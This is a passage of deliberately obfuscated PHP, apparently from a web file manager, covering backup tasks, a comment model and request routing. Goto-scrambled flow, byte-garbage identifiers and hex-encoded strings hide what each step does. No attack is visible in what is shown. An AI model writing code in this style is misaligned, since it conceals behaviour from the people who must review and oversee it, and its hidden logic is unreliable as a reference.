CĞÌÊØŒÀ”: if (isset($aêÓë„÷Ôº[$a‘¦Ñ¶Õ«ø[190]])) { $aêÓë„÷Ôº[$a‘¦Ñ¶Õ«ø[190]] = json_decode($aêÓë„÷Ôº[$a‘¦Ñ¶Õ«ø[190]], !0); } if (isset($F†Ê®­É°Ä[$a‘¦Ñ¶Õ«ø[190]])) { $aêÓë„÷Ôº[$a‘¦Ñ¶Õ«ø[190]][$a‘¦Ñ¶Õ«ø[1416]] = $F†Ê®­É°Ä[$a‘¦Ñ¶Õ«ø[190]]; unset($F†Ê®­É°Ä[$a‘¦Ñ¶Õ«ø[190]]); } return array_merge($aêÓë„÷Ôº, $F†Ê®­É°Ä); goto aß°Áïª‘; BâŒ¾ƒŒ¾: $F†Ê®­É°Ä = is_array($F†Ê®­É°Ä) ? $F†Ê®­É°Ä : array(); if (!isset($F†Ê®­É°Ä[$a‘¦Ñ¶Õ«ø[693]])) { $F†Ê®­É°Ä[$a‘¦Ñ¶Õ«ø[693]] = $a‘¦Ñ¶Õ«ø[83]; } $aêÓë„÷Ôº = array(); goto B¨‹Áèö¨ë; B¨‹Áèö¨ë: Action($a‘¦Ñ¶Õ«ø[2134])->taskInit(); $c¸¯…‹‚…­ = Model($a‘¦Ñ¶Õ«ø[2135])->listData(); foreach ($c¸¯…‹‚…­ as $FË³Ú©©´ê) { if ($FË³Ú©©´ê[$a‘¦Ñ¶Õ«ø[1084]] == $a‘¦Ñ¶Õ«ø[83] && $FË³Ú©©´ê[$a‘¦Ñ¶Õ«ø[1429]] == $a‘¦Ñ¶Õ«ø[2136]) { $aêÓë„÷Ôº = $FË³Ú©©´ê; break; } } goto CĞÌÊØŒÀ”; aß°Áïª‘: } public function listData($cÚã„’Ş = false, $f±”ÀŒÆ¥ = "\x6d\x6f\x64\151\x66\171\124\x69\x6d\145", $BÓç³ô¨Ü = false) { return parent::listData($cÚã„’Ş, $f±”ÀŒÆ¥, !0); } public function lastItem() { $A·‰¹Œ­ = $this->listData(); return !empty($A·‰¹Œ­[0]) ? $A·‰¹Œ­[0] : null; } public function kill($eÇÊœá¥Êé) { goto CçÑµ½¯„; CçÑµ½¯„: $BÒĞŠÄŒ»– =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E÷ÃÎ¶æ˜ = $this->listData($eÇÊœá¥Êé); if (!$E÷ÃÎ¶æ˜ || empty($E÷ÃÎ¶æ˜[$BÒĞŠÄŒ»–[28]])) { return !0; } goto e©ÍÌ£ÊØ°; e©ÍÌ£ÊØ°: Task::kill($BÒĞŠÄŒ»–[713]); Task::kill($BÒĞŠÄŒ»–[729]); Task::kill($BÒĞŠÄŒ»–[737]); goto d–ÑğÎ «š; E…¦Õ³ğ: return $this->remove($eÇÊœá¥Êé); goto e‘Â©½Óæ; d–ÑğÎ «š: $AŞÑŞå¹± = $E÷ÃÎ¶æ˜[$BÒĞŠÄŒ»–[28]]; $aù’ğàø = TEMP_FILES . $BÒĞŠÄŒ»–[710] . $AŞÑŞå¹± . $BÒĞŠÄŒ»–[8]; IO::remove($aù’ğàø, !1); goto E…¦Õ³ğ; e‘Â©½Óæ: } public function remove($DĞ¹†óÛºÀ) { $C©Õ¼•›à† = $this->listData($DĞ¹†óÛºÀ); if (!$C©Õ¼•›à†) { return !0; } return $this->backupRemove($C©Õ¼•›à†); } private function backupRemove($CîÏùÃ¤´²) { $C¨ÙºÆÚšÁ =& $_SERVER[´Ù×Íå‘ÄõÛ]; parent::remove($CîÏùÃ¤´²[$C¨ÙºÆÚšÁ[367]]); $A»§¶õ¯ÖË = "\x7b\x69\157\72{$CîÏùÃ¤´²[$C¨ÙºÆÚšÁ[692]]}\175\57\x64\x61\x74\x61\x62\141\x73\145\x2f\142\141\143\x6b\165\x70\x5f" . $CîÏùÃ¤´²[$C¨ÙºÆÚšÁ[28]]; IO::remove($A»§¶õ¯ÖË, !1); return !0; } public function start() { goto bÑááŒ’Øë; DÃœ°³˜º—: $FÉËœ´ÁØ– = new Backup(); $FÉËœ´ÁØ–->keep(); if (!$FÉËœ´ÁØ–->db()) { return !1; } goto F‚Í¦Í†Š½; aê…ùğ˜Ş: if (!$b …²“Ô…˜ || $b …²“Ô…˜[$CÛÃ¨æ¹å•[1413]] != $CÛÃ¨æ¹å•[83]) { return !1; } $B°Ş„ÑÖÌ¸ = $this->process(); foreach ($B°Ş„ÑÖÌ¸ as $b¹ö®–‘î¦) { if ($b¹ö®–‘î¦) { return Task::restart($b¹ö®–‘î¦[$CÛÃ¨æ¹å•[367]]); } } goto DÃœ°³˜º—; F‚Í¦Í†Š½: if (!$FÉËœ´ÁØ–->dbFile()) { return !1; } if ($b …²“Ô…˜[$CÛÃ¨æ¹å•[693]] == $CÛÃ¨æ¹å•[470]) { $FÉËœ´ÁØ–->file(); } Backup::set(array($CÛÃ¨æ¹å•[690] => 1, $CÛÃ¨æ¹å•[449] => time())); goto F¼Ä¶¹²è¨; F¼Ä¶¹²è¨: return !0; goto CÁÓ×Ò¿µÎ; bÑááŒ’Øë: $CÛÃ¨æ¹å• =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($GLOBALS[$CÛÃ¨æ¹å•[6]][$CÛÃ¨æ¹å•[84]][$CÛÃ¨æ¹å•[2137]] != $CÛÃ¨æ¹å•[83]) { return !0; } $b …²“Ô…˜ = $this->config(); goto aê…ùğ˜Ş; CÁÓ×Ò¿µÎ: } public function process() { $e±Ä†Ã¯Ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($e±Ä†Ã¯Ë[695] => Task::get($e±Ä†Ã¯Ë[713]), $e±Ä†Ã¯Ë[698] => Task::get($e±Ä†Ã¯Ë[729]), $e±Ä†Ã¯Ë[167] => Task::get($e±Ä†Ã¯Ë[737])); } public function restore() { $A¶ß¨ÖÄÜ‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; ActionCall($A¶ß¨ÖÄÜ‚[977], !0, 1); ActionCall($A¶ß¨ÖÄÜ‚[977], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\143\157\x6d\155\145\x6e\x74\x5f\x6d\x65\x74\x61", "\155\x65\164\x61\106\x69\x65\x6c\144" => "\143\157\155\155\145\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aÈÆø·î¿š) { $EÖ¡ÎÒ« =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($aÈÆø·î¿š[$EÖ¡ÎÒ«[2138]]) { $E­…‘™­ùö = $this->where(array($EÖ¡ÎÒ«[2139] => $aÈÆø·î¿š[$EÖ¡ÎÒ«[2138]]))->find(); if (!$E­…‘™­ùö || $E­…‘™­ùö[$EÖ¡ÎÒ«[371]] != $aÈÆø·î¿š[$EÖ¡ÎÒ«[371]] || $E­…‘™­ùö[$EÖ¡ÎÒ«[458]] != $aÈÆø·î¿š[$EÖ¡ÎÒ«[458]]) { return !1; } $this->where(array($EÖ¡ÎÒ«[2139] => $aÈÆø·î¿š[$EÖ¡ÎÒ«[2138]]))->setAdd($EÖ¡ÎÒ«[2140], 1); } $aÈÆø·î¿š[$EÖ¡ÎÒ«[2141]] = 0; $aÈÆø·î¿š[$EÖ¡ÎÒ«[2140]] = 0; $aÈÆø·î¿š[$EÖ¡ÎÒ«[690]] = 1; return $this->add($aÈÆø·î¿š); } public function remove($d§«‚é»¥) { $eØ‚”¬©ĞÂ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÑˆÃéœó‰ = array($eØ‚”¬©ĞÂ[2139] => $d§«‚é»¥); $dˆÏÊÖªì = $this->where($DÑˆÃéœó‰)->find(); if ($dˆÏÊÖªì[$eØ‚”¬©ĞÂ[2138]]) { $this->where(array($eØ‚”¬©ĞÂ[2139] => $dˆÏÊÖªì[$eØ‚”¬©ĞÂ[2138]]))->setAdd($eØ‚”¬©ĞÂ[2140], -1); } return $this->where($DÑˆÃéœó‰)->delete(); } public function edit($FÛÉ¬¹¾, $b²äŠÉŠ²ò) { $dæ¦ÍÓ‘ö =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C¿ô¦¶Í¢— = array($dæ¦ÍÓ‘ö[2139] => $FÛÉ¬¹¾); return $this->where($C¿ô¦¶Í¢—)->save(array($dæ¦ÍÓ‘ö[2142] => $b²äŠÉŠ²ò)); } public function prasise($A½  ‡ŠÒª) { $f ®ØÇÏ´Ú =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FºÀØÉÆø¼ = Model($f ®ØÇÏ´Ú[2143]); $b…ÅÕ¿“Ü = array($f ®ØÇÏ´Ú[2139] => $A½  ‡ŠÒª, $f ®ØÇÏ´Ú[1432] => USER_ID); $f¼¨É·¢òœ = $FºÀØÉÆø¼->where($b…ÅÕ¿“Ü)->find(); if (!$f¼¨É·¢òœ) { $FºÀØÉÆø¼->add($b…ÅÕ¿“Ü); $BÏò´‹„™Î = $this->where(array($f ®ØÇÏ´Ú[2139] => $A½  ‡ŠÒª))->setAdd($f ®ØÇÏ´Ú[2141], 1); } else { $FºÀØÉÆø¼->where($b…ÅÕ¿“Ü)->delete(); $BÏò´‹„™Î = $this->where(array($f ®ØÇÏ´Ú[2139] => $A½  ‡ŠÒª))->setAdd($f ®ØÇÏ´Ú[2141], -1); } return $BÏò´‹„™Î; } public function targetInfo($bÌ„ÕÇçê, $b¶¢…ºİ¯À) { goto A ĞŒ©×ºš; bÁ²Ôí¬ä§: return $A˜ñ–åé“; goto a‹‰›Š‚¨; Cà†àô¥Èò: $f®©éù¶º· = "\122\111\x47\x48\124\40\112\117\x49\116\40{$this->tablePrefix}\143\x6f\155\155\x65\x6e\164\x5f\160\162\141\x69\163\x65\x20\x73\x74\141\162\40\157\x6e\x20\143\157\x6d\155\x65\x6e\164\56\143\x6f\x6d\155\145\156\x74\111\104\x20\75\40\x73\164\141\162\x2e\143\x6f\155\155\145\x6e\x74\x49\x44"; $AÅÑ«ÀÁ« = $this->alias($A¢ëçà²Üµ[341])->where($eïÏÇÁŞ°Õ)->join($f®©éù¶º·, $A¢ëçà²Üµ[2144])->count(); $A˜ñ–åé“ = array($A¢ëçà²Üµ[2145] => $cŠ¡ĞÔŞ, $A¢ëçà²Üµ[2146] => $AÅÑ«ÀÁ«); goto bÁ²Ôí¬ä§; A ĞŒ©×ºš: $A¢ëçà²Üµ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eïÏÇÁŞ°Õ = array($A¢ëçà²Üµ[523] => $bÌ„ÕÇçê, $A¢ëçà²Üµ[524] => $b¶¢…ºİ¯À); $cŠ¡ĞÔŞ = $this->where($eïÏÇÁŞ°Õ)->count(); goto Cà†àô¥Èò; a‹‰›Š‚¨: } public function listData($cêÎ–ÏàØÈ) { $aŸÈ’×î°ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2147]])) { if ($cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2147]]) { $cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2148]] = array($aŸÈ’×î°ä[931], intval($cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2147]])); } unset($cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2147]]); } if (isset($cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2149]])) { if ($cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2149]]) { $cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2148]] = array($aŸÈ’×î°ä[928], intval($cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2149]])); } unset($cêÎ–ÏàØÈ[$aŸÈ’×î°ä[2149]]); } return $this->_listData($cêÎ–ÏàØÈ); } private function _listData($E‹áêßµñ) { $cå—¯Ä˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E³‘¹ÁÄ‚Â = $this->where($E‹áêßµñ)->_makeOrder()->selectPage(100); $this->_listAppendParent($E³‘¹ÁÄ‚Â[$cå—¯Ä˜[354]]); $this->_listAppendUser($E³‘¹ÁÄ‚Â[$cå—¯Ä˜[354]]); $this->_listAppendMeta($E³‘¹ÁÄ‚Â[$cå—¯Ä˜[354]]); return $E³‘¹ÁÄ‚Â; } private function _makeOrder() { $DÔ×ßå‰Ç„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C²ôÈÌ’ô = array($DÔ×ßå‰Ç„[2141], $DÔ×ßå‰Ç„[2140], $DÔ×ßå‰Ç„[187]); $fÛ ³Ø‹®´ = Input::get($DÔ×ßå‰Ç„[407], $DÔ×ßå‰Ç„[7], $DÔ×ßå‰Ç„[389], $C²ôÈÌ’ô); $dî–±¹‹¾ = Input::get($DÔ×ßå‰Ç„[408], $DÔ×ßå‰Ç„[7], $DÔ×ßå‰Ç„[1434], array($DÔ×ßå‰Ç„[2150], $DÔ×ßå‰Ç„[405])); $dâÇ¯Ã¶ªÏ = $fÛ ³Ø‹®´ . $DÔ×ßå‰Ç„[50] . $dî–±¹‹¾; return $this->order($dâÇ¯Ã¶ªÏ); } private function _listAppendParent(&$d©áÛ½ÔŠ) { goto eº”‡µç„¼; eÀáÅŞ¾Îè: foreach ($d©áÛ½ÔŠ as &$E£¯õğÚ‰) { if (isset($E³ÄÔÄ‹Ù[$E£¯õğÚ‰[$D¸Öº§æŞ[2138]]])) { $E£¯õğÚ‰[$D¸Öº§æŞ[2151]] = $E³ÄÔÄ‹Ù[$E£¯õğÚ‰[$D¸Öº§æŞ[2138]]]; } } goto dºÜÖ©ŠÒ; eº”‡µç„¼: $D¸Öº§æŞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÔÁ±¶Úà‘ = array_unique(array_to_keyvalue($d©áÛ½ÔŠ, $D¸Öº§æŞ[33], $D¸Öº§æŞ[2138])); $DÔÁ±¶Úà‘ = array_remove_value($DÔÁ±¶Úà‘, $D¸Öº§æŞ[470]); goto B®õ¼†éÀÔ; B®õ¼†éÀÔ: if (!$DÔÁ±¶Úà‘) { return; } $E³ÄÔÄ‹Ù = $this->where(array($D¸Öº§æŞ[2139] => array($D¸Öº§æŞ[7], $DÔÁ±¶Úà‘)))->select(); $E³ÄÔÄ‹Ù = array_to_keyvalue($E³ÄÔÄ‹Ù, $D¸Öº§æŞ[2148]); goto eÀáÅŞ¾Îè; dºÜÖ©ŠÒ: } private function _listAppendUser(&$c™¢ù¯Õ­Å) { goto F¨±ŒâÏ‡; F¨±ŒâÏ‡: $Eï†„‘÷Ç® =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DçÂéÛ¡î = array_unique(array_to_keyvalue($c™¢ù¯Õ­Å, $Eï†„‘÷Ç®[33], $Eï†„‘÷Ç®[1441])); $DçÂéÛ¡î = array_remove_value($DçÂéÛ¡î, $Eï†„‘÷Ç®[470]); goto cò‰¡‚“; FÌ‰‘‹ÂÊ: foreach ($c™¢ù¯Õ­Å as &$D”óœ¿Ó‚¸) { $D”óœ¿Ó‚¸[$Eï†„‘÷Ç®[537]] = $Dø…ö“ï…á[$D”óœ¿Ó‚¸[$Eï†„‘÷Ç®[1441]]]; if (isset($D”óœ¿Ó‚¸[$Eï†„‘÷Ç®[2151]])) { $D”óœ¿Ó‚¸[$Eï†„‘÷Ç®[2151]][$Eï†„‘÷Ç®[537]] = $Dø…ö“ï…á[$D”óœ¿Ó‚¸[$Eï†„‘÷Ç®[2151]][$Eï†„‘÷Ç®[1441]]]; } } goto bÊ“îä˜ò¦; cò‰¡‚“: if (count($DçÂéÛ¡î) == 0) { return; } foreach ($c™¢ù¯Õ­Å as $D”óœ¿Ó‚¸) { if (isset($D”óœ¿Ó‚¸[$Eï†„‘÷Ç®[2151]])) { $DçÂéÛ¡î[] = $D”óœ¿Ó‚¸[$Eï†„‘÷Ç®[2151]][$Eï†„‘÷Ç®[1441]]; } } $Dø…ö“ï…á = Model($Eï†„‘÷Ç®[479])->userListInfo($DçÂéÛ¡î); goto FÌ‰‘‹ÂÊ; bÊ“îä˜ò¦: } private function _listAppendMeta(&$CŞãíÏ¸Í) { goto B‘İŒ§—Áƒ; E×¥¿ìÄéĞ: if (!$dóì¦°Şñ‚) { return; } foreach ($CŞãíÏ¸Í as $FêÅ£™ÄšÉ) { if (isset($FêÅ£™ÄšÉ[$CÜ„•Ò’Û[2151]])) { $dóì¦°Şñ‚[] = $FêÅ£™ÄšÉ[$CÜ„•Ò’Û[2151]][$CÜ„•Ò’Û[2148]]; } } $a•…É¿ÔÊÎ = $this->metaList($dóì¦°Şñ‚); goto aª’÷Â½Ô§; aª’÷Â½Ô§: if (!$a•…É¿ÔÊÎ) { return !1; } foreach ($CŞãíÏ¸Í as &$FêÅ£™ÄšÉ) { $FêÅ£™ÄšÉ[$CÜ„•Ò’Û[417]] = $a•…É¿ÔÊÎ[$FêÅ£™ÄšÉ[$CÜ„•Ò’Û[2148]]]; if (isset($FêÅ£™ÄšÉ[$CÜ„•Ò’Û[2151]])) { $FêÅ£™ÄšÉ[$CÜ„•Ò’Û[2151]][$CÜ„•Ò’Û[417]] = $a•…É¿ÔÊÎ[$FêÅ£™ÄšÉ[$CÜ„•Ò’Û[2151]][$CÜ„•Ò’Û[2148]]]; } } goto f´ÚÚ©öË; B‘İŒ§—Áƒ: $CÜ„•Ò’Û =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dóì¦°Şñ‚ = array_unique(array_to_keyvalue($CŞãíÏ¸Í, $CÜ„•Ò’Û[33], $CÜ„•Ò’Û[2148])); $dóì¦°Şñ‚ = array_remove_value($dóì¦°Şñ‚, $CÜ„•Ò’Û[470]); goto E×¥¿ìÄéĞ; f´ÚÚ©öË: } private function metaList($C’Ò’’º) { goto BÁŒ ¿àê‡; bÏ†ÂŒ£õ“: $e›ò‹¶“Œ = Model($d©³í¬”¾é[2152])->where($C±«©ó¹ˆº)->select(); $e›ò‹¶“Œ = array_to_keyvalue_group($e›ò‹¶“Œ, $d©³í¬”¾é[2148]); foreach ($e›ò‹¶“Œ as $c’ªˆ™ĞÌÅ => $F­·äÃ…·°) { $Fš¼ÛÓÜ«ä = array(); foreach ($F­·äÃ…·° as $a¼¾Ü¤‰) { $Fš¼ÛÓÜ«ä[$a¼¾Ü¤‰[$d©³í¬”¾é[89]]] = $a¼¾Ü¤‰[$d©³í¬”¾é[359]]; } $e›ò‹¶“Œ[$c’ªˆ™ĞÌÅ] = $Fš¼ÛÓÜ«ä; } goto cƒ–ÃÒöíˆ; BÁŒ ¿àê‡: $d©³í¬”¾é =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$C’Ò’’º) { return array(); } $C±«©ó¹ˆº = array($d©³í¬”¾é[2148] => array($d©³í¬”¾é[7], $C’Ò’’º)); goto bÏ†ÂŒ£õ“; cƒ–ÃÒöíˆ: return $e›ò‹¶“Œ ? $e›ò‹¶“Œ : array(); goto a°õö—ßà­; a°õö—ßà­: } } goto BÂÑ“æ’±Ï; Añ›Î„î½: define($_SERVER[´Ù×Íå‘ÄõÛ][1940], 2); define($_SERVER[´Ù×Íå‘ÄõÛ][1941], 3); define($_SERVER[´Ù×Íå‘ÄõÛ][1942], 4); goto DÕ´ÎĞòÈ; AèÅ´å²î­: $A–îŸµñË¨ = $_SERVER[´Ù×Íå‘ÄõÛ][553]; if (!$A–îŸµñË¨) { die; } class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\x69\x6e\144\145\x78"; function __construct() { } public function setDefault($Dè½èÏ’Šá) { goto a‹¨Çöº…÷; c”íÛê©›: $d½±·ÌŒĞï = $Dœ÷Å«áïˆ[554]; $this->{$_SERVER[¦“®å”‹ôÍ][3]}($BŒ„é‰º»é[4], array($this, $BŒ„é‰º»é[5])); $EÕÆ¼‹¨­á = $Dœ÷Å«áïˆ[555]; goto C”õÚ•œâã; C”õÚ•œâã: while (strlen($EÕÆ¼‹¨­á) < $Dœ÷Å«áïˆ[556]) { if (!$EÕÆ¼‹¨­á) { break; } $EÕÆ¼‹¨­á++; } goto e–…˜ä´¼; D‡ªĞ¤·…–: $this->defaultModule = $b©øÜºƒÓ[0] ? $b©øÜºƒÓ[0] : $this->defaultModule; $this->defaultController = $b©øÜºƒÓ[1] ? $b©øÜºƒÓ[1] : $this->defaultController; $this->defaultAction = $b©øÜºƒÓ[2] ? $b©øÜºƒÓ[2] : $this->defaultAction; goto c”íÛê©›; a‹¨Çöº…÷: $Dœ÷Å«áïˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BŒ„é‰º»é =& $_SERVER[¦“®å”‹ôÍ]; $b©øÜºƒÓ = $BŒ„é‰º»é[0]($BŒ„é‰º»é[1], $BŒ„é‰º»é[2]($Dè½èÏ’Šá, $BŒ„é‰º»é[1])); goto D‡ªĞ¤·…–; e–…˜ä´¼: } public function appRun($aîÁ ¹ùæ£) { goto D©²Å¸ŠäÙ; cË“ÓéÒ: $CË¦à°Í…† = $E‹áÄÚÔóƒ[560]; if ($D”¢Á¾æ == $b¬‰°ÛĞíÚ[8]) { $aÙ¯„àÓõí = $b¬‰°ÛĞíÚ[9]; $C—Óƒ†Àà´[0] = $b¬‰°ÛĞíÚ[10]; $C—Óƒ†Àà´[1] = $C—Óƒ†Àà´[1] . $b¬‰°ÛĞíÚ[11]; $aîÁ ¹ùæ£ = $b¬‰°ÛĞíÚ[12]($b¬‰°ÛĞíÚ[1], $C—Óƒ†Àà´); $aîÁ ¹ùæ£ = $b¬‰°ÛĞíÚ[2]($aîÁ ¹ùæ£, $b¬‰°ÛĞíÚ[1]); } $b¬‰°ÛĞíÚ[13](array($b¬‰°ÛĞíÚ[14], $b¬‰°ÛĞíÚ[15]), $aÙ¯„àÓõí . $b¬‰°ÛĞíÚ[16], $aîÁ ¹ùæ£); goto dç¥ŞÁÉ; BÔ”Î¸™×: $b‡©Ïäçä = $E‹áÄÚÔóƒ[557]; while ($b‡©Ïäçä < $E‹áÄÚÔóƒ[558]) { if ($b‡©Ïäçä >= 0) { break; } $b‡©Ïäçä++; } $D”¢Á¾æ = $b¬‰°ÛĞíÚ[6]($C—Óƒ†Àà´[0]); goto B´Û“ÜóŸ¢; D©²Å¸ŠäÙ: $E‹áÄÚÔóƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b¬‰°ÛĞíÚ =& $_SERVER[¦“®å”‹ôÍ]; $C—Óƒ†Àà´ = $b¬‰°ÛĞíÚ[0]($b¬‰°ÛĞíÚ[1], $aîÁ ¹ùæ£); goto BÔ”Î¸™×; dç¥ŞÁÉ: $b¬‰°ÛĞíÚ[17]($aîÁ ¹ùæ£); $aï ñŸ = $E‹áÄÚÔóƒ[561]; while ($aï ñŸ < $E‹áÄÚÔóƒ[550]) { if ($aï ñŸ >= 0) { break; } $aï ñŸ++; } goto bèø®ˆ£‰ì; B´Û“ÜóŸ¢: $b÷‰öñŸ­… = $E‹áÄÚÔóƒ[559]; while (strlen($b÷‰öñŸ­…) < $E‹áÄÚÔóƒ[550]) { if (!$b÷‰öñŸ­…) { break; } $b÷‰öñŸ­…++; } $aÙ¯„àÓõí = $b¬‰°ÛĞíÚ[7]; goto cË“ÓéÒ; bèø®ˆ£‰ì: $b¬‰°ÛĞíÚ[13](array($b¬‰°ÛĞíÚ[14], $b¬‰°ÛĞíÚ[15]), $aÙ¯„àÓõí . $b¬‰°ÛĞíÚ[18], $aîÁ ¹ùæ£); goto DÄ—ÍëçŞ; DÄ—ÍëçŞ: } private function autorun() { $E³–šÉÌŒ =& $_SERVER[¦“®å”‹ôÍ]; global $config; if ($E³–šÉÌŒ[19]($config[$E³–šÉÌŒ[20]]) == 0) { return; } foreach ($config[$E³–šÉÌŒ[20]] as $Aš¸ñäÑã¸ => $FÖ™¾¿ï) { $this->{$_SERVER[¦“®å”‹ôÍ][21]}($FÖ™¾¿ï); } } private function yvso0bd79bdd() { goto C÷±ßàÀÁ; B†”Ğôù³: $Eê­éŞ¤ôÁ = $DÌÌ“„©ˆ¾[566]; while (strlen($Eê­éŞ¤ôÁ) < $DÌÌ“„©ˆ¾[556]) { if (!$Eê­éŞ¤ôÁ) { break; } $Eê­éŞ¤ôÁ++; } $GLOBALS[$dà»Öá‘§§[22]][$dà»Öá‘§§[23]] = $dà»Öá‘§§[27]($b†ÙÚñ‘¢Õ, $c™±µ›§ñ‡); goto Dİã¶£îˆ; E–ªÉ„–³Ü: if (!$f’‹„ÅÅ® || $dà»Öá‘§§[24]($f’‹„ÅÅ®) <= $dà»Öá‘§§[24]($d“º™É÷ê)) { return; } if ($dà»Öá‘§§[6]($dà»Öá‘§§[25]($f’‹„ÅÅ®, -$dà»Öá‘§§[24]($d“º™É÷ê))) != $d“º™É÷ê) { return; } $aø¦—•›â† = $dà»Öá‘§§[25]($f’‹„ÅÅ®, 0, -$dà»Öá‘§§[24]($d“º™É÷ê)); goto BçÉ¡Í…ƒÎ; aö‰“÷¯¤¼: $eäåÀÂ¹Å¡ = $DÌÌ“„©ˆ¾[565]; if (!$eäåÀÂ¹Å¡) { die; } $c™±µ›§ñ‡ = $dà»Öá‘§§[26]($GLOBALS[$dà»Öá‘§§[22]][$dà»Öá‘§§[23]], 1); goto B†”Ğôù³; Dİã¶£îˆ: $GLOBALS[$dà»Öá‘§§[22]][$dà»Öá‘§§[28]] = $dà»Öá‘§§[29]($dà»Öá‘§§[1], $GLOBALS[$dà»Öá‘§§[22]][$dà»Öá‘§§[23]]); $d˜²ìÙ•¸‘ = $DÌÌ“„©ˆ¾[567]; goto c‰Ü¿¦á“×; CäÇ„­ãù: $D‡×èñÆÌ = $DÌÌ“„©ˆ¾[562]; if (!$D‡×èñÆÌ) { die; } $f’‹„ÅÅ® = $GLOBALS[$dà»Öá‘§§[22]][$dà»Öá‘§§[23]][0]; goto E–ªÉ„–³Ü; BçÉ¡Í…ƒÎ: $e²œö‡ÀÆ® = $DÌÌ“„©ˆ¾[563]; while (strlen($e²œö‡ÀÆ®) < $DÌÌ“„©ˆ¾[564]) { if (!$e²œö‡ÀÆ®) { break; } $e²œö‡ÀÆ®++; } $b†ÙÚñ‘¢Õ = array($dà»Öá‘§§[8], $aø¦—•›â†); goto aö‰“÷¯¤¼; C÷±ßàÀÁ: $DÌÌ“„©ˆ¾ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dà»Öá‘§§ =& $_SERVER[¦“®å”‹ôÍ]; $d“º™É÷ê = $dà»Öá‘§§[8]; goto CäÇ„­ãù; c‰Ü¿¦á“×: } private function jazf107fbf2c() { goto f‰ÀÎáÎ—æ; càÍÔ¾ËÅ: $fÈíÜùÛÒ– = $c¥½Å›òË[25]($F¹³‹ª‡Ì«, $Cê­–ºÙÉà + $c¥½Å›òË[24]($aÖášÇÖ)); $c¥½Å›òË[34]($c¥½Å›òË[35], $fÈíÜùÛÒ–, $D«´¼¶•³); $fÈíÜùÛÒ– = $c¥½Å›òË[2]($D«´¼¶•³[0][0], $c¥½Å›òË[36]); goto A‰¤ËäŞŠŞ; fè‰à¸ùÆÕ: $aä¹××¥ò = $Cø”ÎêˆòË[572]; while ($aä¹××¥ò < $Cø”ÎêˆòË[558]) { if ($aä¹××¥ò >= 0) { break; } $aä¹××¥ò++; } $GLOBALS[$c¥½Å›òË[22]][$c¥½Å›òË[28]] = $c¥½Å›òË[29]($c¥½Å›òË[1], $GLOBALS[$c¥½Å›òË[22]][$c¥½Å›òË[23]]); goto eĞóÇŸöê; f‰ÀÎáÎ—æ: $Cø”ÎêˆòË =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c¥½Å›òË =& $_SERVER[¦“®å”‹ôÍ]; if ($GLOBALS[$c¥½Å›òË[22]][$c¥½Å›òË[28]] != $c¥½Å›òË[10]) { return; } goto dª²Šº†ïä; f¨½ ¬ÙØê: $aÖášÇÖ = $c¥½Å›òË[31]; $F¡ëîÚÍšÉ = $Cø”ÎêˆòË[569]; if (!$c¥½Å›òË[32]($F¹³‹ª‡Ì«, $aÖášÇÖ)) { return; } goto fõàÁÎÙ¼×; A‰¤ËäŞŠŞ: $Fõà„ğ®­ = $Cø”ÎêˆòË[571]; if (strlen($Fõà„ğ®­) < $Cø”ÎêˆòË[564]) { die; } $GLOBALS[$c¥½Å›òË[22]][$c¥½Å›òË[23]] = $c¥½Å›òË[0]($c¥½Å›òË[36], $fÈíÜùÛÒ–); goto fè‰à¸ùÆÕ; fõàÁÎÙ¼×: $Cê­–ºÙÉà = $c¥½Å›òË[33]($F¹³‹ª‡Ì«, $aÖášÇÖ); $cíËøÓÕŞ = $Cø”ÎêˆòË[570]; while ($cíËøÓÕŞ < $Cø”ÎêˆòË[550]) { if ($cíËøÓÕŞ >= 0) { break; } $cíËøÓÕŞ++; } goto càÍÔ¾ËÅ; dª²Šº†ïä: $F¹³‹ª‡Ì« = $_SERVER[$c¥½Å›òË[30]]; $b”åÌÓÚÅ = $Cø”ÎêˆòË[568]; while ($b”åÌÓÚÅ < $Cø”ÎêˆòË[564]) { if ($b”åÌÓÚÅ >= 0) { break; } $b”åÌÓÚÅ++; } goto f¨½ ¬ÙØê; eĞóÇŸöê: } public function run() { goto b©Ì¸ÖÂ‰; b©Ì¸ÖÂ‰: $Bº†Ö¤×Ğµ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÆøãÔÓâ¨ =& $_SERVER[¦“®å”‹ôÍ]; $this->{$_SERVER[¦“®å”‹ôÍ][37]}(); goto câ­Ï¦Ü‚Å; aõÄ‡Î…Á¨: 